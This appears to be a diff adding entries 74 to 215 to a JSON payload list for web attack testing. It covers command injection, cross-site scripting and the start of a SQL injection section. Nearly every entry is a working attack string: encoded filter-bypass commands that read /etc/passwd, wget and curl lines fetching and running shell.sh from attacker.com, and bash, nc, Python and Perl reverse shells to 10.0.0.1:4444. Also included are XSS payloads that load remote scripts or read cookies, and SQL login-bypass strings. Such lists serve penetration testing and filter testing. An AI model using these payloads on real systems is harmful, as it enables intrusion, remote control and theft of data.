+{"id":74,"category":"Command Injection","subcategory":"Encoded `whoami`","payload":"%60whoami%60","description":"URL-encoded backtick whoami."},
+{"id":75,"category":"Command Injection","subcategory":"Encoded `id`","payload":"%60id%60","description":"URL-encoded backtick id."},
+{"id":76,"category":"Command Injection","subcategory":"Encoded `ls -la`","payload":"%60ls%20-la%60","description":"URL-encoded backtick ls -la."},
+{"id":77,"category":"Command Injection","subcategory":"CR/LF combos","payload":"%0a%0d    %0a    %0d    %0a%0d%0a%0d    %0d%0a","description":"Various newline / carriage return combinations."},
+{"id":78,"category":"Command Injection","subcategory":"IFS ls -la","payload":"%3B%24%7BIFS%7Dls%24%7BIFS%7D-la","description":"${IFS} space replacement for filter bypass."},
+{"id":79,"category":"Command Injection","subcategory":"IFS whoami","payload":"%3B%24%7BIFS%7Dwhoami","description":"${IFS} whoami."},
+{"id":80,"category":"Command Injection","subcategory":"IFS id","payload":"%3B%24%7BIFS%7Did","description":"${IFS} id."},
+{"id":81,"category":"Command Injection","subcategory":"IFS cat passwd","payload":"%3B%24%7BIFS%7Dcat%24%7BIFS%7D%2Fetc%2Fpasswd","description":"${IFS} cat /etc/passwd."},
+{"id":82,"category":"Command Injection","subcategory":"IFS nc reverse","payload":"%3B%24%7BIFS%7Dnc%24%7BIFS%7D-e%24%7BIFS%7D%2Fbin%2Fsh%24%7BIFS%7D10.0.0.1%24%7BIFS%7D4444","description":"${IFS} nc -e reverse shell."},
+{"id":83,"category":"Command Injection","subcategory":"printf hex ls -la","payload":"%3B%24%28printf%24%7BIFS%7D%22%5Cx6c%5Cx73%5Cx20%5Cx2d%5Cx6c%5Cx61%22%29","description":"printf hex-encoded 'ls -la'."},
+{"id":84,"category":"Command Injection","subcategory":"printf hex whoami","payload":"%3B%24%28printf%24%7BIFS%7D%22%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69%22%29","description":"printf hex-encoded whoami."},
+{"id":85,"category":"Command Injection","subcategory":"printf hex id","payload":"%3B%24%28printf%24%7BIFS%7D%22%5Cx69%5Cx64%22%29","description":"printf hex-encoded id."},
+{"id":86,"category":"Command Injection","subcategory":"printf hex cat passwd","payload":"%3B%24%28printf%24%7BIFS%7D%22%5Cx63%5Cx61%5Cx74%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%29","description":"printf hex-encoded cat /etc/passwd."},
+{"id":87,"category":"Command Injection","subcategory":"backtick printf ls","payload":"%3B%60printf%24%7BIFS%7D%22%5Cx6c%5Cx73%22%60","description":"Backtick-wrapped printf hex ls."},
+{"id":88,"category":"Command Injection","subcategory":"backtick printf whoami","payload":"%3B%60printf%24%7BIFS%7D%22%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69%22%60","description":"Backtick-wrapped printf hex whoami."},
+{"id":89,"category":"Command Injection","subcategory":"backtick printf id","payload":"%3B%60printf%24%7BIFS%7D%22%5Cx69%5Cx64%22%60","description":"Backtick-wrapped printf hex id."},
+{"id":90,"category":"Command Injection","subcategory":"backtick printf cat passwd","payload":"%3B%60printf%24%7BIFS%7D%22%5Cx63%5Cx61%5Cx74%5Cx20%5Cx2f%5Cx65%5Cx74%5Cx63%5Cx2f%5Cx70%5Cx61%5Cx73%5Cx73%5Cx77%5Cx64%22%60","description":"Backtick-wrapped printf hex cat passwd."},
+{"id":91,"category":"Command Injection","subcategory":"base64 cat passwd","payload":"%3Becho%24%7BIFS%7DY2F0IC9ldGMvcGFzc3dk%7Cbase64%24%7BIFS%7D-d%7Csh","description":"Base64-encoded 'cat /etc/passwd' piped to sh."},
+{"id":92,"category":"Command Injection","subcategory":"base64 whoami","payload":"%3Becho%24%7BIFS%7Dd2hvYW1p%7Cbase64%24%7BIFS%7D-d%7Csh","description":"Base64-encoded whoami piped to sh."},
+{"id":93,"category":"Command Injection","subcategory":"base64 id","payload":"%3Becho%24%7BIFS%7DaWQ%3D%7Cbase64%24%7BIFS%7D-d%7Csh","description":"Base64-encoded id piped to sh."},
+{"id":94,"category":"Command Injection","subcategory":"base64 cat passwd (bash)","payload":"%3Becho%24%7BIFS%7DY2F0IC9ldGMvcGFzc3dk%7Cbase64%24%7BIFS%7D-d%7Cbash","description":"Base64-encoded cat /etc/passwd piped to bash."},
+{"id":95,"category":"Command Injection","subcategory":"wget + chmod + exec","payload":"%3Bwget%24%7BIFS%7Dhttp%3A%2F%2Fattacker.com%2Fshell.sh%24%7BIFS%7D-O%24%7BIFS%7D%2Ftmp%2Fshell.sh%3Bsh%24%7BIFS%7D%2Ftmp%2Fshell.sh","description":"Download + execute a stage-2 script."},
+{"id":96,"category":"Command Injection","subcategory":"curl + exec","payload":"%3Bcurl%24%7BIFS%7Dhttp%3A%2F%2Fattacker.com%2Fshell.sh%24%7BIFS%7D-o%24%7BIFS%7D%2Ftmp%2Fshell.sh%3Bsh%24%7BIFS%7D%2Ftmp%2Fshell.sh","description":"curl stage-2 then execute."},
+{"id":97,"category":"Command Injection","subcategory":"bash reverse (IFS)","payload":"%3Bbash%24%7BIFS%7D-c%24%7BIFS%7D%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261%27","description":"${IFS}-obfuscated bash reverse shell."},
+{"id":98,"category":"Command Injection","subcategory":"sh reverse (IFS)","payload":"%3Bsh%24%7BIFS%7D-c%24%7BIFS%7D%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261%27","description":"${IFS}-obfuscated sh reverse shell."},
+{"id":99,"category":"Command Injection","subcategory":"python reverse","payload":"%3Bpython%24%7BIFS%7D-c%24%7BIFS%7D%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.0.0.1%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%27","description":"Python one-liner reverse shell."},
+{"id":100,"category":"Command Injection","subcategory":"perl reverse","payload":"%3Bperl%24%7BIFS%7D-e%24%7BIFS%7D%27use%20Socket%3B%24i%3D%2210.0.0.1%22%3B%24p%3D4444%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27","description":"Perl one-liner reverse shell."},
+
+/* ============================================================
+   CROSS-SITE SCRIPTING (XSS)
+   ============================================================ */
+{"id":101,"category":"Cross-Site Scripting (XSS)","subcategory":"Basic script","payload":"<script>alert('XSS')<\/script>","description":"Canonical reflected/stored XSS probe."},
+{"id":102,"category":"Cross-Site Scripting (XSS)","subcategory":"img onerror","payload":"<img src=x onerror=alert(1)>","description":"Fires on broken image load; survives many filters."},
+{"id":103,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload","payload":"<svg onload=alert(1)>","description":"Executes on SVG load."},
+{"id":104,"category":"Cross-Site Scripting (XSS)","subcategory":"body onload","payload":"<body onload=alert(1)>","description":"Event handler on injected body tag."},
+{"id":105,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript URI","payload":"javascript:alert('XSS')","description":"For href/src sinks that accept URIs."},
+{"id":106,"category":"Cross-Site Scripting (XSS)","subcategory":"Attribute breakout","payload":"\"><script>alert(1)<\/script>","description":"Breaks out of an HTML attribute value."},
+{"id":107,"category":"Cross-Site Scripting (XSS)","subcategory":"Filter-evasion polyglot","payload":"';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//--><\/SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))<\/SCRIPT>","description":"Multi-context breakout string covering quoted JS, HTML and script contexts."},
+{"id":108,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded script alert XSS","payload":"%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E","description":"URL-encoded canonical script XSS."},
+{"id":109,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded script alert 1","payload":"%3Cscript%3Ealert%281%29%3C%2Fscript%3E","description":"URL-encoded minimal script XSS."},
+{"id":110,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded script prompt","payload":"%3Cscript%3Eprompt%281%29%3C%2Fscript%3E","description":"Prompt-based XSS probe."},
+{"id":111,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded script confirm","payload":"%3Cscript%3Econfirm%281%29%3C%2Fscript%3E","description":"Confirm-based XSS probe."},
+{"id":112,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded cookie theft","payload":"%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E","description":"Reads document.cookie into an alert."},
+{"id":113,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded domain probe","payload":"%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E","description":"Reads document.domain."},
+{"id":114,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded location probe","payload":"%3Cscript%3Ealert%28document.location%29%3C%2Fscript%3E","description":"Reads document.location."},
+{"id":115,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded window.name probe","payload":"%3Cscript%3Ealert%28window.name%29%3C%2Fscript%3E","description":"Reads window.name."},
+{"id":116,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded history probe","payload":"%3Cscript%3Ealert%28history.length%29%3C%2Fscript%3E","description":"Reads history.length."},
+{"id":117,"category":"Cross-Site Scripting (XSS)","subcategory":"Uppercase script","payload":"%3CSCRIPT%3Ealert%281%29%3C%2FSCRIPT%3E","description":"Case bypass on tag names."},
+{"id":118,"category":"Cross-Site Scripting (XSS)","subcategory":"Random-case script","payload":"%3CScRiPt%3Ealert%281%29%3C%2FScRiPt%3E","description":"Random-case script tag."},
+{"id":119,"category":"Cross-Site Scripting (XSS)","subcategory":"External script src (proto-relative)","payload":"%3Cscript%20src%3D%2F%2fattacker.com%2Fxss.js%3E%3C%2Fscript%3E","description":"Loads a remote XSS script (protocol-relative)."},
+{"id":120,"category":"Cross-Site Scripting (XSS)","subcategory":"External script src http","payload":"%3Cscript%20src%3Dhttp%3A%2F%2fattacker.com%2Fxss.js%3E%3C%2Fscript%3E","description":"Loads a remote XSS script over http."},
+{"id":121,"category":"Cross-Site Scripting (XSS)","subcategory":"atob eval","payload":"%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E","description":"Base64-decoded eval() to evade filters."},
+{"id":122,"category":"Cross-Site Scripting (XSS)","subcategory":"fromCharCode eval","payload":"%3Cscript%3Eeval%28String.fromCharCode%2897%2c108%2c101%2c114%2c116%2c40%2c49%2c41%29%29%3C%2Fscript%3E","description":"fromCharCode obfuscated alert(1)."},
+{"id":123,"category":"Cross-Site Scripting (XSS)","subcategory":"fromCharCode XSS","payload":"%3Cscript%3Ealert%28String.fromCharCode%2888%2c83%2c83%29%29%3C%2Fscript%3E","description":"alert('XSS') via fromCharCode."},
+{"id":124,"category":"Cross-Site Scripting (XSS)","subcategory":"Script comment padding","payload":"%3Cscript%3E%2F%2Falert(1)%3C%2Fscript%3E","description":"Line-comment prefix for filter evasion."},
+{"id":125,"category":"Cross-Site Scripting (XSS)","subcategory":"Script newline padding","payload":"%3Cscript%3E%0Aalert(1)%0A%3C%2Fscript%3E","description":"Newline-padded script body."},
+{"id":126,"category":"Cross-Site Scripting (XSS)","subcategory":"Script CR padding","payload":"%3Cscript%3E%0Dalert(1)%0D%3C%2Fscript%3E","description":"Carriage-return-padded script body."},
+{"id":127,"category":"Cross-Site Scripting (XSS)","subcategory":"Script tab padding","payload":"%3Cscript%3E%09alert(1)%09%3C%2Fscript%3E","description":"Tab-padded script body."},
+{"id":128,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror 1","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E","description":"URL-encoded img onerror XSS."},
+{"id":129,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror XSS","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E","description":"URL-encoded img onerror alert('XSS')."},
+{"id":130,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror prompt","payload":"%3Cimg%20src%3D1%20onerror%3Dprompt%281%29%3E","description":"URL-encoded img onerror prompt."},
+{"id":131,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror confirm","payload":"%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E","description":"URL-encoded img onerror confirm."},
+{"id":132,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror cookie","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E","description":"URL-encoded img onerror cookie theft."},
+{"id":133,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror domain","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E","description":"URL-encoded img onerror domain probe."},
+{"id":134,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img display:none","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%20style%3Ddisplay%3Anone%3E","description":"Invisible img onerror XSS."},
+{"id":135,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded img onerror id","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%20id%3Dx%3E","description":"img onerror with id attribute."},
+{"id":136,"category":"Cross-Site Scripting (XSS)","subcategory":"Encoded uppercase IMG","payload":"%3CIMG%20SRC%3Dx%20ONERROR%3Dalert%281%29%3E","description":"All-uppercase tag and handler."},
+{"id":137,"category":"Cross-Site Scripting (XSS)","subcategory":"img numeric entities","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%26%2340%3B1%26%2341%3B%3E","description":"Numeric HTML entities for parens."},
+{"id":138,"category":"Cross-Site Scripting (XSS)","subcategory":"img hex escape","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%5Cx28%201%20%5Cx29%3E","description":"Hex escapes for parens in JS."},
+{"id":139,"category":"Cross-Site Scripting (XSS)","subcategory":"img hex entity parens","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%26%23x28%3B1%26%23x29%3B%3E","description":"Hex entity parens."},
+{"id":140,"category":"Cross-Site Scripting (XSS)","subcategory":"img hex entity digit","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28%26%23x31%3B%29%3E","description":"Hex entity digit."},
+{"id":141,"category":"Cross-Site Scripting (XSS)","subcategory":"img src javascript eval","payload":"%3Cimg%20src%3Dx%3Aalert%281%29%20onerror%3Deval%28src%29%3E","description":"eval(src) trick with custom protocol."},
+{"id":142,"category":"Cross-Site Scripting (XSS)","subcategory":"img src javascript URI","payload":"%3Cimg%20src%3Djavascript%3Aalert%281%29%3E","description":"javascript: URI in img src."},
+{"id":143,"category":"Cross-Site Scripting (XSS)","subcategory":"img onerror this.src","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28this.src%29%3E","description":"Leaks element src via onerror."},
+{"id":144,"category":"Cross-Site Scripting (XSS)","subcategory":"img onerror this.id","payload":"%3Cimg%20src%3Dx%20onerror%3Dalert%28this.id%29%3E","description":"Leaks element id via onerror."},
+{"id":145,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload 1","payload":"%3Csvg%20onload%3Dalert%281%29%3E","description":"URL-encoded svg onload XSS."},
+{"id":146,"category":"Cross-Site Scripting (XSS)","subcategory":"svg self-closing onload","payload":"%3Csvg%2Fonload%3Dalert%281%29%3E","description":"Self-closing svg with onload."},
+{"id":147,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload XSS","payload":"%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E","description":"svg onload alert('XSS')."},
+{"id":148,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload cookie","payload":"%3Csvg%20onload%3Dalert%28document.cookie%29%3E","description":"svg onload cookie theft."},
+{"id":149,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload confirm","payload":"%3Csvg%20onload%3Dconfirm%281%29%3E","description":"svg onload confirm."},
+{"id":150,"category":"Cross-Site Scripting (XSS)","subcategory":"svg onload prompt","payload":"%3Csvg%20onload%3Dprompt%281%29%3E","description":"svg onload prompt."},
+{"id":151,"category":"Cross-Site Scripting (XSS)","subcategory":"svg nested script","payload":"%3Csvg%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3C%2Fsvg%3E","description":"Script nested inside svg."},
+{"id":152,"category":"Cross-Site Scripting (XSS)","subcategory":"svg nested script XSS","payload":"%3Csvg%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E%3C%2Fsvg%3E","description":"Nested svg script with alert('XSS')."},
+{"id":153,"category":"Cross-Site Scripting (XSS)","subcategory":"svg animate onbegin","payload":"%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E","description":"svg animate onbegin handler."},
+{"id":154,"category":"Cross-Site Scripting (XSS)","subcategory":"svg animate onbegin XSS","payload":"%3Csvg%3E%3Canimate%20onbegin%3Dalert%28%27XSS%27%29%20attributeName%3Dx%20dur%3D1s%3E","description":"svg animate onbegin alert('XSS')."},
+{"id":155,"category":"Cross-Site Scripting (XSS)","subcategory":"svg xlink href","payload":"%3Csvg%3E%3Ca%20xlink%3Ahref%3Djavascript%3Aalert%281%29%3E%3Ctext%3Eclick%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E","description":"Clickable svg link with javascript: URI."},
+{"id":156,"category":"Cross-Site Scripting (XSS)","subcategory":"body onload 1","payload":"%3Cbody%20onload%3Dalert%281%29%3E","description":"URL-encoded body onload XSS."},
+{"id":157,"category":"Cross-Site Scripting (XSS)","subcategory":"body onload XSS","payload":"%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E","description":"body onload alert('XSS')."},
+{"id":158,"category":"Cross-Site Scripting (XSS)","subcategory":"body onpageshow","payload":"%3Cbody%20onpageshow%3Dalert%281%29%3E","description":"body onpageshow handler."},
+{"id":159,"category":"Cross-Site Scripting (XSS)","subcategory":"body onfocus autofocus","payload":"%3Cbody%20onfocus%3Dalert%281%29%20autofocus%3E","description":"body onfocus + autofocus."},
+{"id":160,"category":"Cross-Site Scripting (XSS)","subcategory":"body onload cookie","payload":"%3Cbody%20onload%3Dalert%28document.cookie%29%3E","description":"body onload cookie theft."},
+{"id":161,"category":"Cross-Site Scripting (XSS)","subcategory":"input autofocus onfocus","payload":"%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E","description":"input autofocus onfocus."},
+{"id":162,"category":"Cross-Site Scripting (XSS)","subcategory":"input onfocus autofocus","payload":"%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E","description":"Attribute-order variant."},
+{"id":163,"category":"Cross-Site Scripting (XSS)","subcategory":"input onblur","payload":"%3Cinput%20onblur%3Dalert%281%29%3E","description":"input onblur handler."},
+{"id":164,"category":"Cross-Site Scripting (XSS)","subcategory":"input onchange","payload":"%3Cinput%20onchange%3Dalert%281%29%3E","description":"input onchange handler."},
+{"id":165,"category":"Cross-Site Scripting (XSS)","subcategory":"iframe javascript URI","payload":"%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E","description":"iframe with javascript: URI."},
+{"id":166,"category":"Cross-Site Scripting (XSS)","subcategory":"iframe srcdoc","payload":"%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E","description":"iframe srcdoc with inline script."},
+{"id":167,"category":"Cross-Site Scripting (XSS)","subcategory":"iframe remote","payload":"%3Ciframe%20src%3Dhttp%3A%2F%2Fattacker.com%2Fxss.html%3E%3C%2Fiframe%3E","description":"Remote iframe for clickjacking/XSS."},
+{"id":168,"category":"Cross-Site Scripting (XSS)","subcategory":"video onerror","payload":"%3Cvideo%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E","description":"video onerror XSS."},
+{"id":169,"category":"Cross-Site Scripting (XSS)","subcategory":"audio onerror","payload":"%3Caudio%20src%3Dx%20onerror%3Dalert%281%29%3E%3C%2Faudio%3E","description":"audio onerror XSS."},
+{"id":170,"category":"Cross-Site Scripting (XSS)","subcategory":"video source onerror","payload":"%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E","description":"Nested source onerror."},
+{"id":171,"category":"Cross-Site Scripting (XSS)","subcategory":"details open ontoggle","payload":"%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E","description":"details ontoggle with open."},
+{"id":172,"category":"Cross-Site Scripting (XSS)","subcategory":"details ontoggle open","payload":"%3Cdetails%20ontoggle%3Dalert%281%29%20open%3E","description":"Attribute-order variant."},
+{"id":173,"category":"Cross-Site Scripting (XSS)","subcategory":"marquee onstart","payload":"%3Cmarquee%20onstart%3Dalert%281%29%3E","description":"marquee onstart handler."},
+{"id":174,"category":"Cross-Site Scripting (XSS)","subcategory":"marquee onfinish","payload":"%3Cmarquee%20onfinish%3Dalert%281%29%3E","description":"marquee onfinish handler."},
+{"id":175,"category":"Cross-Site Scripting (XSS)","subcategory":"select onfocus","payload":"%3Cselect%20onfocus%3Dalert%281%29%20autofocus%3E","description":"select onfocus autofocus."},
+{"id":176,"category":"Cross-Site Scripting (XSS)","subcategory":"textarea onfocus","payload":"%3Ctextarea%20onfocus%3Dalert%281%29%20autofocus%3E","description":"textarea onfocus autofocus."},
+{"id":177,"category":"Cross-Site Scripting (XSS)","subcategory":"keygen onfocus","payload":"%3Ckeygen%20onfocus%3Dalert%281%29%20autofocus%3E","description":"Legacy keygen onfocus autofocus."},
+{"id":178,"category":"Cross-Site Scripting (XSS)","subcategory":"object data javascript","payload":"%3Cobject%20data%3Djavascript%3Aalert%281%29%3E%3C%2Fobject%3E","description":"object data javascript: URI."},
+{"id":179,"category":"Cross-Site Scripting (XSS)","subcategory":"embed javascript","payload":"%3Cembed%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E","description":"embed src javascript: URI."},
+{"id":180,"category":"Cross-Site Scripting (XSS)","subcategory":"applet code javascript","payload":"%3Capplet%20code%3Djavascript%3Aalert%281%29%3E%3C%2Fapplet%3E","description":"Legacy applet XSS."},
+{"id":181,"category":"Cross-Site Scripting (XSS)","subcategory":"math mi //","payload":"%3Cmath%3E%3Cmi%2F%2F%3E%3C%2Fmath%3E","description":"MathML edge-case parsing quirk."},
+{"id":182,"category":"Cross-Site Scripting (XSS)","subcategory":"math href javascript","payload":"%3Cmath%20href%3Djavascript%3Aalert%281%29%3ECLICK%3C%2Fmath%3E","description":"math href javascript: URI."},
+{"id":183,"category":"Cross-Site Scripting (XSS)","subcategory":"isindex action","payload":"%3Cisindex%20action%3Djavascript%3Aalert%281%29%20type%3Dimage%3E","description":"Legacy isindex XSS."},
+{"id":184,"category":"Cross-Site Scripting (XSS)","subcategory":"form action javascript","payload":"%3Cform%20action%3Djavascript%3Aalert%281%29%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E","description":"Form action javascript: URI."},
+{"id":185,"category":"Cross-Site Scripting (XSS)","subcategory":"button formaction","payload":"%3Cform%3E%3Cbutton%20formaction%3Djavascript%3Aalert%281%29%3EX%3C%2Fbutton%3E%3C%2Fform%3E","description":"Button formaction javascript: URI."},
+{"id":186,"category":"Cross-Site Scripting (XSS)","subcategory":"input formaction","payload":"%3Cform%3E%3Cinput%20formaction%3Djavascript%3Aalert%281%29%20type%3Dsubmit%20value%3DX%3E%3C%2Fform%3E","description":"Input formaction javascript: URI."},
+{"id":187,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript:alert(1)","payload":"javascript%3Aalert%281%29","description":"URL-encoded javascript: URI."},
+{"id":188,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript:alert('XSS')","payload":"javascript%3Aalert%28%27XSS%27%29","description":"Encoded javascript: alert('XSS')."},
+{"id":189,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript:prompt","payload":"javascript%3Aprompt%281%29","description":"Encoded javascript: prompt."},
+{"id":190,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript:confirm","payload":"javascript%3Aconfirm%281%29","description":"Encoded javascript: confirm."},
+{"id":191,"category":"Cross-Site Scripting (XSS)","subcategory":"javascript:cookie","payload":"javascript%3Aalert%28document.cookie%29","description":"Encoded javascript: cookie alert."},
+{"id":192,"category":"Cross-Site Scripting (XSS)","subcategory":"java&#x73;cript","payload":"java%26%23x73%3Bcript%3Aalert%281%29","description":"Entity-encoded 's' in javascript scheme."},
+{"id":193,"category":"Cross-Site Scripting (XSS)","subcategory":"java&#x73;cript XSS","payload":"java%26%23x73%3Bcript%3Aalert%28%27XSS%27%29","description":"Entity-encoded scheme + alert('XSS')."},
+{"id":194,"category":"Cross-Site Scripting (XSS)","subcategory":"JaVaScRiPt mixed case","payload":"JaVaScRiPt%3Aalert%281%29","description":"Mixed-case scheme."},
+{"id":195,"category":"Cross-Site Scripting (XSS)","subcategory":"jAvAsCrIpT mixed case","payload":"jAvAsCrIpT%3Aalert%281%29","description":"Another mixed-case variant."},
+{"id":196,"category":"Cross-Site Scripting (XSS)","subcategory":"Full HTML-entity scheme","payload":"%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3Balert%281%29","description":"Every character hex-entity encoded."},
+{"id":197,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout script","payload":"%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E","description":"\" > <script>… breakout."},
+{"id":198,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout img","payload":"%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E","description":"\" > <img onerror> breakout."},
+{"id":199,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout svg","payload":"%22%3E%3Csvg%20onload%3Dalert%281%29%3E","description":"\" > <svg onload> breakout."},
+{"id":200,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout body","payload":"%22%3E%3Cbody%20onload%3Dalert%281%29%3E","description":"\" > <body onload> breakout."},
+{"id":201,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout iframe","payload":"%22%3E%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E","description":"\" > <iframe src=javascript:> breakout."},
+{"id":202,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout input","payload":"%22%3E%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E","description":"\" > <input autofocus onfocus> breakout."},
+{"id":203,"category":"Cross-Site Scripting (XSS)","subcategory":"Double-quote breakout details","payload":"%22%3E%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E","description":"\" > <details open ontoggle> breakout."},
+{"id":204,"category":"Cross-Site Scripting (XSS)","subcategory":"Single-quote breakout script","payload":"%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E","description":"' > <script> breakout."},
+{"id":205,"category":"Cross-Site Scripting (XSS)","subcategory":"Single-quote breakout img","payload":"%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E","description":"' > <img onerror> breakout."},
+{"id":206,"category":"Cross-Site Scripting (XSS)","subcategory":"Single-quote breakout svg","payload":"%27%3E%3Csvg%20onload%3Dalert%281%29%3E","description":"' > <svg onload> breakout."},
+{"id":207,"category":"Cross-Site Scripting (XSS)","subcategory":"Single-quote breakout body","payload":"%27%3E%3Cbody%20onload%3Dalert%281%29%3E","description":"' > <body onload> breakout."},
+{"id":208,"category":"Cross-Site Scripting (XSS)","subcategory":"Backtick breakout script","payload":"%60%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E","description":"` > <script> breakout."},
+{"id":209,"category":"Cross-Site Scripting (XSS)","subcategory":"Backtick breakout img","payload":"%60%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E","description":"` > <img onerror> breakout."},
+{"id":210,"category":"Cross-Site Scripting (XSS)","subcategory":"Backtick breakout svg","payload":"%60%3E%3Csvg%20onload%3Dalert%281%29%3E","description":"` > <svg onload> breakout."},
+{"id":211,"category":"Cross-Site Scripting (XSS)","subcategory":"Classic regex-free alert","payload":"%3Cscript%3Ealert%28%2F%5B%5E%5D%2B%2F.source%29%3C%2Fscript%3E","description":"alert() using a regex literal's source property."},
+{"id":212,"category":"Cross-Site Scripting (XSS)","subcategory":"Quote+regex hybrid","payload":"%22%3E%3Cscript%3Ealert%28%2F%5B%5E%5D%2B%2F.source%29%3C%2Fscript%3E","description":"Breakout + regex-literal alert."},
+
+/* ============================================================
+   SQL INJECTION
+   ============================================================ */
+{"id":213,"category":"SQL Injection","subcategory":"Auth bypass","payload":"' OR '1'='1","description":"Always-true condition to bypass a WHERE clause."},
+{"id":214,"category":"SQL Injection","subcategory":"Comment login","payload":"admin' --","description":"Comments out the password check after the username."},
+{"id":215,"category":"SQL Injection","subcategory":"UNION null probe","payload":"' UNION SELECT NULL--","description":"Probe for column count in a UNION-based injection."},
